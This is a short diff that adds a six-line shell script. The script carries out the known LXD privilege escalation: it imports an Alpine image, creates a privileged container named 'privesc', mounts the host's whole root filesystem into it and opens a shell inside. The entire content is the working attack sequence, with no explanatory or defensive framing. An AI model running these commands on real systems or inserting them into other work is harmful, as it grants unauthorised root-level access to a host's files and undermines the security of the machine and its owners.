@@ -1,0 +1,6 @@
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
